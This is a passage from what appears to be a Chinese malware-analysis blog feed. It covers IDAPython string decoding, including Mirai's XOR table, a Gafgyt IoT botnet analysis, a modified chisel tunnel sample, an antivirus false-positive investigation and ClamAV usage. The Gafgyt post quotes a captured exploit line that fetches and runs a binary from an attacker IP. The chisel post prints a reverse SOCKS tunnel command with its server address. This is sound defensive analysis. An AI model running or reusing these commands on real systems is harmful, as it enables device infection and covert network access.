class="hljs-keyword">func</span>)))<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span>=<span class="hljs-title">idaapi</span>.<span class="hljs-title">get_func</span><span class="hljs-params">(here()</span></span>)                <span class="hljs-comment">//获取当前地址的函数</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start:0x%x end:0x%x&quot;</span>%(<span class="hljs-keyword">func</span>.start_ea,<span class="hljs-keyword">func</span>.end_ea))<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">ea</span>=here()<br><span class="hljs-attribute">start</span>=idc.get_func_attr(ea,FUNCATTR_START)<br><span class="hljs-attribute">end</span>=idc.get_func_attr(ea,FUNCATTR_END)<br><span class="hljs-attribute">cur_addr</span>=start<br><span class="hljs-keyword">while</span> cur_addr&lt;=end:<br>    <span class="hljs-built_in">print</span>(hex(cur_addr),idc.GetDisasm(cur_addr))<br>    <span class="hljs-attribute">cur_addr</span>=idc.next_head(cur_addr,end)<br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import binascii<br>ea=here<span class="hljs-literal">()</span><br>start=idc.get<span class="hljs-constructor">_func_attr(<span class="hljs-params">ea</span>,FUNCATTR_START)</span><br><span class="hljs-keyword">end</span>=idc.get<span class="hljs-constructor">_func_attr(<span class="hljs-params">ea</span>,FUNCATTR_END)</span><br>addr=start<br><span class="hljs-keyword">while</span> addr&lt;=<span class="hljs-keyword">end</span>:<br>    <span class="hljs-keyword">if</span> print<span class="hljs-constructor">_insn_mnem(<span class="hljs-params">addr</span>)</span><span class="hljs-operator"> == </span><span class="hljs-string">&quot;mov&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;esi&quot;</span> <span class="hljs-keyword">in</span> print<span class="hljs-constructor">_operand(<span class="hljs-params">addr</span>,0)</span> <span class="hljs-keyword">and</span> addr!=<span class="hljs-number">0x10005b8a</span>:<br>        #print(hex(addr),idc.<span class="hljs-constructor">GetDisasm(<span class="hljs-params">addr</span>)</span>)<br>        str_addr=get<span class="hljs-constructor">_operand_value(<span class="hljs-params">addr</span>,1)</span><br>        #print(hex(str_addr))<br>        hex_str=idc.get<span class="hljs-constructor">_strlit_contents(<span class="hljs-params">str_addr</span>, -1, <span class="hljs-params">idc</span>.STRTYPE_C)</span>   <span class="hljs-comment">//获取当前指令的第二个操作数的值</span><br>        #print(hex_str)<br>        <span class="hljs-built_in">string</span> = binascii.unhexlify(hex_str).decode<span class="hljs-literal">()</span>          <span class="hljs-comment">//16进制转字符串</span><br>        print(<span class="hljs-built_in">string</span>)<br>        set<span class="hljs-constructor">_cmt(<span class="hljs-params">addr</span>, <span class="hljs-params">string</span>, 1)</span><br>    addr=idc.next<span class="hljs-constructor">_head(<span class="hljs-params">addr</span>,<span class="hljs-params">end</span>)</span><br></code></pre></td></tr></table></figure><h2 id="mirai解码字符串"><a href="#mirai解码字符串" class="headerlink" title="mirai解码字符串"></a>mirai解码字符串</h2><p>以mirai为代表的IOT僵尸网络蠕虫病毒会采用XOR的方式将字符串隐写到table当中，每次使用的时候调用 <strong>table_unlock_val(uint8_t id)</strong> 函数，这样其实对分析造成了很大的麻烦，可以直接使用idapython对table中的加密数据进行解码，备注。</p><p>首先定位到table_init函数</p><img src="image-20240516100929555.png" alt="image-20240516100929555" style="zoom:80%;" /><p>可以看到函数对一些16进制字符进行了操作，然后从汇编代码进行分析</p><img src="image-20240516100652203.png" alt="image-20240516100652203" style="zoom:80%;" /><p>代码分析可以看出，push字符串后都会执行Memcpy方法，将字符串复制到新申请的内存空间中，可以通过这一特征定位到相应的位置。算法分析是异或0x3A。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idc<br><span class="hljs-keyword">import</span> idaapi<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStrAddress</span>(<span class="hljs-params">addr</span>):<br>    addr = prev_head(addr)<br>    addr = prev_head(addr)<br>    <span class="hljs-keyword">if</span> print_insn_mnem(addr) == <span class="hljs-string">&quot;push&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;offset&quot;</span> <span class="hljs-keyword">in</span> print_operand(addr,<span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> get_operand_value(addr,<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getEncodeStr</span>(<span class="hljs-params">addr</span>):<br>    out = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        ch = idaapi.get_byte(addr)<br>        <span class="hljs-keyword">if</span> ch != <span class="hljs-number">0</span>:<br>            out += <span class="hljs-built_in">chr</span>(ch)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>        addr += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> out<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getDecodeStr</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    i = <span class="hljs-number">0</span><br>    out = <span class="hljs-string">&quot;&quot;</span><br>    length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-keyword">while</span> i &lt; length:<br>        out += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]) ^ <span class="hljs-number">0x3A</span>)<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> out<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> XrefsTo(<span class="hljs-number">0x0804EF40</span>,flags = <span class="hljs-number">0</span>):<br>            addr = getStrAddress(x.frm)<br>            <span class="hljs-keyword">if</span> addr !=<span class="hljs-number">0</span>:<br>                eStr = getEncodeStr(addr)<br>                <span class="hljs-comment">#print(eStr)</span><br>                dStr = getDecodeStr(eStr)<br>                <span class="hljs-comment">#print(dStr)</span><br>                set_cmt(prev_head(x.frm), dStr, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.yunyawu.com/2020/06/28/ida-python%e5%ad%a6%e4%b9%a0/">https://www.yunyawu.com/2020/06/28/ida-python%e5%ad%a6%e4%b9%a0/</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDApython</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gafgyt木马分析</title>
    <link href="/2024/05/09/Gafgyt%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <url>/2024/05/09/Gafgyt%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>设备报警</p><p><img src="/2024/05/09/Gafgyt%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E6%8D%95%E8%8E%B7.PNG" alt="捕获"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">orf;cd /tmp; rm -rf mpsl; /bin/busybox wget http://78.40.117.227/rebirth.mpsl; chmod +x rebirth.mpsl; ./rebirth.mpsl; rm -rf rebirth.mpsl<br></code></pre></td></tr></table></figure><p>通过playload可以看出利用了Realtek SDK远程命令执行漏洞（CVE-2021-35394），该漏洞于2021年8月16日被公开披露，由于许多IoT设备厂商都使用Realtek芯片组，所以影响较为广泛，属于典型的供应链安全漏洞。</p><p>本来以为是Mirai家族的常见扫描行为，结果下载程序后发现属于Gafgyt。</p><p>Gafgyt是另一款物联网僵尸网络程序，被认为是Mirai的前身，主要感染基于Linux的IoT设备，来发起分布式拒绝服务攻击（DDoS）。它是除Mirai家族之外，最大的活跃物联网僵尸网络家族，其源代码在2015年初被部分泄露，变种也极多。</p><h3 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h3><p>此次分析以x86架构版本为例</p><table><thead><tr><th>文件名</th><th>rebirth.x86</th></tr></thead><tbody><tr><td>大小</td><td>101269 字节</td></tr><tr><td>MD5</td><td>C070B0F1804A8F4EA5744268341C5A1C</td></tr><tr><td>SHA1</td><td>B3F4BAD7B03A796A40457DA0ECD2612FF51F5518</td></tr></tbody></table><p><img src="/2024/05/09/Gafgyt%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20240508160831718.png" alt="image-20240508160831718"></p><p>64位ELF文件，有符号表。</p><h3 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h3><p>由于样本没有去除符号表，使用IDA打开后可以看到架构很清晰</p><p><img src="/2024/05/09/Gafgyt%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20240509093834707.png" alt="image-20240509093834707"></p><p>从main函数开始分析，首先初始化随机数，然后通过getOurIP函数获取了一些网络信息，确保设备网络连接正常，创建守护进程，设置忽略中断信号，防止程序意外终止。</p><p><img src="/2024/05/09/Gafgyt%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20240509094025026.png" alt="image-20240509094025026"></p><p>创建套接字并启动对CNC服务器的上线请求。</p><p><img src="/2024/05/09/Gafgyt%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20240509094545002.png" alt="image-20240509094545002"></p><p>抓包可以看到，受害机向CNC服务器（78.40.117.227:666）发送IP和架构的信息，CNC服务器会回复 “PING” 确认在线。</p><p><img src="/2024/05/09/Gafgyt%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE140148.png" alt="屏幕截图 2024-05-08 140148"></p><p>strace跟踪程序</p><p><img src="/2024/05/09/Gafgyt%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20240509103400194.png" alt="image-20240509103400194"></p><p>创建持续接收CNC发来的数据指令</p><p><img src="/2024/05/09/Gafgyt%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20240509095043016.png" alt="image-20240509095043016"></p><p>对CNC服务器传输来的指令进行格式化处理，并交给cncinput方法进行进一步解析。</p><p><img src="/2024/05/09/Gafgyt%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20240509095135664.png" alt="image-20240509095135664"></p><p>cncinput方法中包含UDP、XMAS（圣诞树攻击）、VSE（针对游戏服务器）、TCP、STD五种方式的攻击，其中默认使用STD发动攻击，STOP指令用于停止攻击，且攻击在启动之前会检查是否提供了正确数量的参数，例如UDP攻击需要目的IP地址、目的端口、持续时间、数据包等。</p><p><img src="/2024/05/09/Gafgyt%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20240509095946228.png" alt="image-20240509095946228"></p><p>其中TCP攻击中还包括syn、rst、fin、ack、psh五种攻击方式</p><p><img src="/2024/05/09/Gafgyt%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20240509101642422.png" alt="image-20240509101642422"></p><p>没有发现暴破和漏洞攻击的模块，或者killer模块，但感染肯定使用漏洞攻击。该样本应该仅属于DDos攻击模块，并且没有去除符号表，字符也没有像Mirai一样进行加密。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.cyber5w.com/gafgyt-backdoor-analysis">https://blog.cyber5w.com/gafgyt-backdoor-analysis</a></p><p><a href="https://www.anquanke.com/post/id/244421">https://www.anquanke.com/post/id/244421</a></p><p><a href="https://www.ctfiot.com/1207.html">https://www.ctfiot.com/1207.html</a></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT僵尸网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>疑似APT32 魔改chisel</title>
    <link href="/2024/03/28/%E7%96%91%E4%BC%BCAPT32-%E9%AD%94%E6%94%B9chisel/"/>
    <url>/2024/03/28/%E7%96%91%E4%BC%BCAPT32-%E9%AD%94%E6%94%B9chisel/</url>
    
    <content type="html"><![CDATA[<h3 id="样本基本信息"><a href="#样本基本信息" class="headerlink" title="样本基本信息"></a>样本基本信息</h3><p><img src="/2024/03/28/%E7%96%91%E4%BC%BCAPT32-%E9%AD%94%E6%94%B9chisel/image-20240328105923560.png" alt="image-20240328105923560"></p><p>64位控制台程序，由go语言编写</p><p>MD5: DB1F693F4C88E46545BFB7A2157B25AA</p><h3 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h3><p>虚拟机运行后请求IP 139.99.71.234</p><img src="image-20240328110128194.png" alt="image-20240328110128194" style="zoom:80%;" /><p>运行出现明显的运行提示，IDA反编译发现有明显的参数特征，尝试添加参数运行失败，根据初步怀疑是开源工具修改</p><p><img src="/2024/03/28/%E7%96%91%E4%BC%BCAPT32-%E9%AD%94%E6%94%B9chisel/image-20240328110725298.png" alt="image-20240328110725298"></p><p>根据字符串可以定位到chisel内网穿透工具 <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p><p><img src="/2024/03/28/%E7%96%91%E4%BC%BCAPT32-%E9%AD%94%E6%94%B9chisel/image-20240328111456606.png" alt="image-20240328111456606"></p><p>对比Github上的源码以及反汇编之后的函数结构，可以认定该样本为开源工具chisel修改编译而成（左：样本；右：开源源码编译）</p><img src="image-20240328152530922.png" alt="image-20240328152530922" style="zoom:80%;" /><p>原版chisel使用命令行界面</p><p><img src="/2024/03/28/%E7%96%91%E4%BC%BCAPT32-%E9%AD%94%E6%94%B9chisel/image-20240328112251438.png" alt="image-20240328112251438"></p><p>基本执行流程和源码一致，主要差别在于内置配置命令，建立隧道反向代理</p><p><img src="/2024/03/28/%E7%96%91%E4%BC%BCAPT32-%E9%AD%94%E6%94%B9chisel/image-20240328132218077.png" alt="image-20240328132218077"></p><p><img src="/2024/03/28/%E7%96%91%E4%BC%BCAPT32-%E9%AD%94%E6%94%B9chisel/image-20240328153322582.png" alt="image-20240328153322582"></p><p>通过XOR数组，解码出要执行的命令</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">(chisel)</span> client <span class="hljs-params">--tls-skip-verify</span> <span class="hljs-params">--fingerprint</span> OQOI4xljZo9Gd1Z/CHcfm/KkEPssbpEg/zcIHq4lqBk= <span class="hljs-params">--max-retry-interval</span> 60m https:<span class="hljs-string">//139.99.71.234</span> R<span class="hljs-function">:1080</span><span class="hljs-function">:socks</span><br></code></pre></td></tr></table></figure><p>即在受害主机上启动Chisel工具，建立一个加密的隧道连接到指定的Chisel服务器，实现反向代理，允许攻击者访问内部网络。</p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chisel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>explorer误杀</title>
    <link href="/2024/02/23/explorer%E8%AF%AF%E6%9D%80/"/>
    <url>/2024/02/23/explorer%E8%AF%AF%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>2024.2.3  看雪社区成员发表文章  <a href="https://bbs.kanxue.com/thread-280449.htm">[讨论]火绒5.0.68.0残忍杀害本机explorer.exe</a></p><p>2024.2.18 火绒安全论坛官方发表公告  <a href="https://bbs.huorong.cn/thread-136360-1-1.html">[产品公告] 关于近期explorer误报问题说明</a></p><p>当然还有B站 &#x3D; &#x3D;</p><p>从上述文章可以看出，火绒在 <strong>2024年1月12日</strong> 之前的旧版本，在windows10 22h2更新补丁（KB5034203、KB5034763等）后，存在误杀系统explorer.exe资源管理器文件的风险。</p><p>有些人应该是为了火绒剑保留老版安装包。</p><p><img src="/2024/02/23/explorer%E8%AF%AF%E6%9D%80/2024-02-21155506.png" alt="屏幕截图"></p><p><img src="/2024/02/23/explorer%E8%AF%AF%E6%9D%80/image-20240222103620778.png" alt="image-20240222103620778"></p><p>据悉，受影响的文件版本包括从3992-4161(当前最新)。</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p><img src="/2024/02/23/explorer%E8%AF%AF%E6%9D%80/image-20240223092136887.png" alt="image-20240223092136887"></p><p><strong>IsHijackingProcessRunning</strong>函数</p><img src="image-20240223092359371.png" alt="image-20240223092359371" style="zoom:80%;" /><p>返回上层函数<strong>CheckCampaignAvailability</strong></p><p><img src="/2024/02/23/explorer%E8%AF%AF%E6%9D%80/image-20240223092748240.png" alt="image-20240223092748240"></p><p>返回上层函数<strong>RunFeedsCampaign</strong></p><p><img src="/2024/02/23/explorer%E8%AF%AF%E6%9D%80/image-20240223094616532.png" alt="image-20240223094616532"></p><p>总之，就是<strong>检测360进程，如果存在，就关闭Feeds资讯和兴趣</strong>。Interesting</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>explorer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ClamAV</title>
    <link href="/2023/12/25/ClamAV/"/>
    <url>/2023/12/25/ClamAV/</url>
    
    <content type="html"><![CDATA[<p>官网 <a href="https://www.clamav.net/">https://www.clamav.net/</a></p><p>官方文档 <a href="https://docs.clamav.net/">https://docs.clamav.net/</a></p><h3 id="Ubuntu在线安装"><a href="#Ubuntu在线安装" class="headerlink" title="Ubuntu在线安装"></a>Ubuntu在线安装</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install clamav<br>或者 sudo apt-<span class="hljs-built_in">get</span> install clamtk     #图形化界面，感觉不如命令行直观<br>sudo clamscan <span class="hljs-attribute">--exclude-dir</span>=/sys/ -i -r /<br></code></pre></td></tr></table></figure><p><img src="/2023/12/25/ClamAV/image-20231026132708350.png" alt="image-20231026132708350"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--help -h   Show this help显示此帮助</span><br><span class="hljs-comment">--version -V   Print version number打印版本号</span><br><span class="hljs-comment">--verbose -v   Be verbose详细</span><br><span class="hljs-comment">--archive-verbose -a   Show filenames inside scanned archives在扫描的档案中显示文件名</span><br><span class="hljs-comment">--debug   Enable libclamav&#x27;s debug messages启用libclamav的调试消息</span><br><span class="hljs-comment">--quiet   Only output error messages仅输出错误消息</span><br><span class="hljs-comment">--stdout   Write to stdout instead of stderr. Does not affect &#x27;debug&#x27; messages.写到stdout而不是stderr。不影响“调试”消息。</span><br><span class="hljs-comment">--no-summary   Disable summary at end of scanning扫描结束时禁用摘要</span><br><span class="hljs-comment">--infected -i   Only print infected files仅打印受感染的文件</span><br><span class="hljs-comment">--suppress-ok-results -o   Skip printing OK files跳过打印OK文件</span><br><span class="hljs-comment">--bell   Sound bell on virus detection检测病毒的声音</span><br><span class="hljs-comment">--tempdir=DIRECTORY   Create temporary files in DIRECTORY在目录中创建临时文件</span><br><span class="hljs-comment">--leave-temps[=yes/no(*)]   Do not remove temporary files不要删除临时文件</span><br><span class="hljs-comment">--gen-json[=yes/no(*)]   Generate JSON description of scanned file(s). JSON will be printed and alsodropped to the temp directory if --leave-temps is enabled.生成扫描文件的JSON描述。如果启用--leave-temps，则将打印JSON并将其拖放到temp目录中。</span><br><span class="hljs-comment">--database=FILE/DIR -d FILE/DIR   Load virus database from FILE or load all supported db files from DIR从FILE加载病毒数据库或从DIR加载所有受支持的数据库文件</span><br><span class="hljs-comment">--official-db-only[=yes/no(*)]   Only load official signatures仅加载官方签名</span><br><span class="hljs-comment">--log=FILE -l FILE   Save scan report to FILE将扫描报告保存到FILE</span><br><span class="hljs-comment">--recursive[=yes/no(*)] -r   Scan subdirectories recursively递归扫描子目录</span><br><span class="hljs-comment">--allmatch[=yes/no(*)] -z   Continue scanning within file after finding a match找到匹配项后继续在文件中扫描</span><br><span class="hljs-comment">--cross-fs[=yes(*)/no]   Scan files and directories on other filesystems扫描其他文件系统上的文件和目录</span><br><span class="hljs-comment">--follow-dir-symlinks[=0/1(*)/2]   Follow directory symlinks (0 = never, 1 = direct, 2 = always)遵循目录符号链接（0 =永不，1 =直接，2 =始终）</span><br><span class="hljs-comment">--follow-file-symlinks[=0/1(*)/2]   Follow file symlinks (0 = never, 1 = direct, 2 = always)跟随文件符号链接（0 =从不，1 =直接，2 =始终）</span><br><span class="hljs-comment">--file-list=FILE -f FILE   Scan files from FILE从FILE扫描文件</span><br><span class="hljs-comment">--remove[=yes/no(*)]   Remove infected files. Be careful!删除受感染的文件。小心！</span><br><span class="hljs-comment">--move=DIRECTORY   Move infected files into DIRECTORY将受感染的文件移至目录</span><br><span class="hljs-comment">--copy=DIRECTORY   Copy infected files into DIRECTORY将受感染的文件复制到目录中</span><br><span class="hljs-comment">--exclude=REGEX   Don&#x27;t scan file names matching REGEX不要扫描与REGEX匹配的文件名</span><br><span class="hljs-comment">--exclude-dir=REGEX   Don&#x27;t scan directories matching REGEX不要扫描与REGEX匹配的目录</span><br><span class="hljs-comment">--include=REGEX   Only scan file names matching REGEX仅扫描与REGEX匹配的文件名</span><br><span class="hljs-comment">--include-dir=REGEX   Only scan directories matching REGEX仅扫描与REGEX匹配的目录</span><br><span class="hljs-comment">--bytecode[=yes(*)/no]   Load bytecode from the database从数据库加载字节码</span><br><span class="hljs-comment">--bytecode-unsigned[=yes/no(*)]   Load unsigned bytecode加载无符号字节码</span><br><span class="hljs-comment">--bytecode-timeout=N   Set bytecode timeout (in milliseconds)设置字节码超时（以毫秒为单位）</span><br><span class="hljs-comment">--statistics[=none(*)/bytecode/pcre]   Collect and print execution statistics收集并打印执行统计信息</span><br><span class="hljs-comment">--detect-pua[=yes/no(*)]   Detect Possibly Unwanted Applications检测可能有害的应用程序</span><br><span class="hljs-comment">--exclude-pua=CAT   Skip PUA sigs of category CAT跳过类别CAT的PUA信号</span><br><span class="hljs-comment">--include-pua=CAT   Load PUA sigs of category CAT加载类别为CAT的PUA信号</span><br><span class="hljs-comment">--detect-structured[=yes/no(*)]   Detect structured data (SSN, Credit Card)检测结构化数据（SSN，信用卡）</span><br><span class="hljs-comment">--structured-ssn-format=X   SSN format (0=normal,1=stripped,2=both)SSN格式（0 =正常，1 =剥离，2 =两者）</span><br><span class="hljs-comment">--structured-ssn-count=N   Min SSN count to generate a detect最小SSN计数以生成检测</span><br><span class="hljs-comment">--structured-cc-count=N   Min CC count to generate a detect最小CC计数以生成检测</span><br><span class="hljs-comment">--scan-mail[=yes(*)/no]   Scan mail files扫描邮件文件</span><br><span class="hljs-comment">--phishing-sigs[=yes(*)/no]   Enable email signature-based phishing detection启用基于电子邮件签名的网络钓鱼检测</span><br><span class="hljs-comment">--phishing-scan-urls[=yes(*)/no]   Enable URL signature-based phishing detection启用基于URL签名的网络钓鱼检测</span><br><span class="hljs-comment">--heuristic-alerts[=yes(*)/no]   Heuristic alerts启发式警报</span><br><span class="hljs-comment">--heuristic-scan-precedence[=yes/no(*)]   Stop scanning as soon as a heuristic match is found找到启发式匹配项后立即停止扫描</span><br><span class="hljs-comment">--normalize[=yes(*)/no]   Normalize html, script, and text files. Use normalize=no for yara compatibility规范化html，脚本和文本文件。使用normalize = no获得yara兼容性</span><br><span class="hljs-comment">--scan-pe[=yes(*)/no]   Scan PE files扫描PE文件</span><br><span class="hljs-comment">--scan-elf[=yes(*)/no]   Scan ELF files扫描ELF文件</span><br><span class="hljs-comment">--scan-ole2[=yes(*)/no]   Scan OLE2 containers扫描OLE2容器</span><br><span class="hljs-comment">--scan-pdf[=yes(*)/no]   Scan PDF files扫描PDF文件</span><br><span class="hljs-comment">--scan-swf[=yes(*)/no]   Scan SWF files扫描SWF文件</span><br><span class="hljs-comment">--scan-html[=yes(*)/no]   Scan HTML files扫描HTML文件</span><br><span class="hljs-comment">--scan-xmldocs[=yes(*)/no]   Scan xml-based document files扫描基于xml的文档文件</span><br><span class="hljs-comment">--scan-hwp3[=yes(*)/no]   Scan HWP3 files扫描HWP3文件</span><br><span class="hljs-comment">--scan-archive[=yes(*)/no]   Scan archive files (supported by libclamav)扫描存档文件（libclamav支持）</span><br><span class="hljs-comment">--alert-broken[=yes/no(*)]   Alert on broken executable files (PE &amp; ELF)警报损坏的可执行文件（PE和ELF）</span><br><span class="hljs-comment">--alert-encrypted[=yes/no(*)]   Alert on encrypted archives and documents提醒加密的档案和文件</span><br><span class="hljs-comment">--alert-encrypted-archive[=yes/no(*)]   Alert on encrypted archives警报加密档案</span><br><span class="hljs-comment">--alert-encrypted-doc[=yes/no(*)]   Alert on encrypted documents加密文件警报</span><br><span class="hljs-comment">--alert-macros[=yes/no(*)]   Alert on OLE2 files containing VBA macros对包含VBA宏的OLE2文件发出警报</span><br><span class="hljs-comment">--alert-exceeds-max[=yes/no(*)]   Alert on files that exceed max file size, max scan size, or max recursion limit对超过最大文件大小，最大扫描大小或最大递归限制的文件发出警报</span><br><span class="hljs-comment">--alert-phishing-ssl[=yes/no(*)]   Alert on emails containing SSL mismatches in URLs在URL中包含SSL不匹配的电子邮件时发出警报</span><br><span class="hljs-comment">--alert-phishing-cloak[=yes/no(*)]   Alert on emails containing cloaked URLs对包含隐藏URL的电子邮件发出警报</span><br><span class="hljs-comment">--alert-partition-intersection[=yes/no(*)]   Alert on raw DMG image files containing partition intersections对包含分区相交的原始DMG图像文件发出警报</span><br><span class="hljs-comment">--nocerts   Disable authenticode certificate chain verification in PE files禁用PE文件中的Authenticode证书链验证</span><br><span 